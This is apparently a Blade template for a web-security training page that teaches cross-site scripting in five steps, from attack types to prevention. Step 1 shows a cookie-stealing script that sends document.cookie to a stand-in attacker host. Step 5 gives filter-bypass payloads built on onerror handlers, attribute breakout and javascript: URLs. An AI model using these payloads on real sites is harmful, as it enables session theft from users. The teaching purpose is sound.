@extends('redteam.base')

@section('title', 'Cross-Site Scripting Learning Page')

@section('pagecontent')
<div class="redLearn">
    <form method="POST" action="/learn/xss">
        @csrf
        <input type="hidden" name="step" value="{{ $step }}">
        @if ($step != 1)
            <div class="form-group row mb-0">
                <div class="col-md-8 offset-md-4">
                    <button type="submit" class="btn btn-primary" name="stepChange" value="-1">
                        Previous
                    </button>
                </div>
            </div>
        @endif

        @if ($step == 1)
            <h4>What is an XSS attack?</h4>
            <p>An XSS, or cross-site scripting, attack is when an attacker injects code into a server <br>
                in order to execute malicious javascript on another user's browser. The attacker exploits <br>
                a vulnerability in the website in order to make the malicious javascript appear as it were <br>
                to be a legitimate part of the website.</p>
            <p>If a server uses a script similar to this: </p>
            <p class="sqlInject"><strong>print "<?php echo htmlspecialchars("<html>") ?>" <br>
                print "User Input:" <br>
                print database.userInput <br>
                print "<?php echo htmlspecialchars("</html>") ?>"</strong></p>
            <p>A user could create user input that says: </p>
            <p class="sqlInject"><strong><?php echo htmlspecialchars("<script>") ?>
                window.location='http://attackerswebsite/?cookie='+document.cookie
                <?php echo htmlspecialchars("</script>") ?></strong></p>
            <p>The resulting output on the webpage would then result in: </p>
            <p class="sqlInject"><strong><?php echo htmlspecialchars("<html>") ?> <br>
                User Input: <br>
                <?php echo htmlspecialchars("<script>") ?> <br>
                window.location='http://attackerswebsite/?cookie='+document.cookie <br>
                <?php echo htmlspecialchars("</script>") ?> <br>
                <?php echo htmlspecialchars("</html>") ?></strong></p>
            <p>This malicious javascript displayed on an unsuspecting user's page <br>
                will then execute this javascript and send a request to the attackers <br>
                webpage with the victims cookie as data. This is an example of how <br>
                attackers can obtain private or sensitive information by XSS. This <br>
                is called cookie theft, but there are different kinds like keylogging or phishing.</p>
        @elseif ($step == 2)
            <h4>Types of XSS</h4>
            <ul>
                <li>Persistent XSS: the malicious string is from the website's database</li>
                <li>Reflected XSS: the malicious string is from the user's request</li>
                <li>DOM-based XSS: the vulnerability is client-side and not server-side</li>
            </ul><br>
            <p>The first page went over persistent XSS, where a user submits malicious <br>
                javascript to the database, and then it is accessed. Reflected XSS seems like <br>
                it might be useless if a user is attacking itself, but the user is unaware they <br>
                are submitting a malicious string. This is usually done by an attacker sending <br>
                out a URL with the malicious string inside of its request. When the user clicks <br>
                the URL it will submit the malicious string and then execute that string when displayed <br>
                on the target page.</p>
            <p>DOM-based XSS is a sort of mix between the two previously described types. When the server-side <br>
                sends HTML that contains javascript, sometimes the javascript is responsible for displaying content. <br>
                when this occurs, if the content being displayed is a malicious script, the server-side will <br>
                be completely unaware. This means the browser executes this malicious script client-side <br>
                possibly causing them to send a cookie to the attackers website.</p>
        @elseif ($step == 3)
            <h4>Ways to prevent XSS</h4>
            <p>In order to be able to display user input without the contained script, <br>
                proper input/output handling is needed in your program. Two different ways of <br>
                handling input are encoding and validation. There are a lot of different factors <br>
                into how it actually gets handled. Depending on where the user input is inserted, <br>
                the user may insert the closing delimeter for the HTML tag/code in order to further <br>
                insert malicious javascript.</p>
            <p>Input handling is a good way to neutralize any malicious scripts before they are included <br>
                in the website, but due to context, there is no real way to ensure that input will be <br>
                completely safe. This means output handling is more important and anywhere user input is <br>
                displayed should have proper checks to make sure nothing malicious will happen.</p>
            <p>Output checking, whether on client-side or server-side, is dependent upon when the output will be <br>
                displayed. If the output is accessed and displayed through javascript then it will be necessary <br>
                to validation check client-side to prevent DOM-based XSS attacks. To prevent Persistent or Reflected <br>
                XSS attacks, server-side validation is needed.</p>
        @elseif ($step == 4)
            <h4>Encoding vs Validation</h4>
            <p>Encoding user input is the act of removing certain characters so the string is interpreted as <br>
                a string instead of as code. This involves turning characters like "<" to names following "&". <br>
                There are limitations to encoding, however, because there will always be some context that cannot be <br>
                accounted for. Validation is the act of filtering out user input to remove or block certain <br>
                parts of the input. A common way to validate is to check for HTML tags and filter out some. <br>
                Validation can either classify by whitelisting or blacklisting allowable patterns. If whitelisting, <br>
                then only input following whitelisted patterns will be allowed. If blacklisting, then only <br>
                input that does not follow those blacklisted patterns is allowed. The outcome of validation can <br>
                either be rejected, not using that input, or sanitized and cleaned of invalid patterns.</p>
            <p>A Content Security Policy, or CSP, can be implemented into the header of a website in order to <br>
                limit sources that resources are received from. Website owners can limit where media, images, <br>
                scripts, etc come from and whether to let them come from anywhere besides the host at all. <br>
                This means that XSS attacks cannot use their javascript to link to any external files or harmful <br>
                things.</p>
        @elseif ($step == 5)
            <h4>Other ways to execute XSS</h4>
            <p>If user input is directly included in the html without proper sanitization, <br>
                there are other ways users can inject malicious javascript. Perhaps the code <br>
                contains no javascript itself, but user input is displayed in a <strong>&ltp&gt</strong> tag. <br>
                If sanitation removes <strong>&ltscript&gt</strong> and <strong>&lt/script&gt</strong> from input, users could still <br>
                inject javascript by inputting <strong>&ltimage src="invalidsource" onerror="maliciousJavascript()" /&gt</strong>
                This will try to display the image, and result in an error, causing whatever javascript is contained in the <br>
                <strong>onerror</strong> attribute.</p>
            <p>If user input is included in some type of tag, for example an image tag, then <br>
                the resulting code could be <strong>&ltimage src="&lt?php echo $userInput ?&gt" /&gt</strong><br>
                if the user input closes the src attribute with an invalid source and <br>
                creates an onerror attribute, by inputting <strong>invalid" onerror="maliciousJavascript()</strong><br>
                the resulting code will be <strong>&ltimage src="invalid" onerror="maliciousJavascript()" /&gt</strong> <br>
                causing execution of that javascript.</p>
            <p>Users can also take advantage of GET requests by replacing certain data in the URL of the website <br>
                in order to inject code. If the URL for a website is <strong>https://www.example.com/viewpage?prevpage=home</strong><br>
                the website remembers the last page you visited, so you can return, in the URL as a parameter. The underlying code might be <br>
                <strong>&lta href="&lt?php echo $prevpage ?&gt"&gt Return To Previous Page &lt/a&gt</strong>. <br>
                This means if you enter <strong>javascript:maliciousJavascript()</strong> instead of <strong>home</strong>, when that anchor tag is activated <br>
                it will execute that javascript.
            </p>
        @endif
        <!-- Reference:  https://excess-xss.com/ -->
        @if ($step != 5)
            <div class="form-group row mb-0">
                <div class="col-md-8 offset-md-4">
                    <button type="submit" class="btn btn-primary" name="stepChange" value="1">
                        Next
                    </button>
                </div>
            </div>
        @endif
    </form>
</div>
@endsection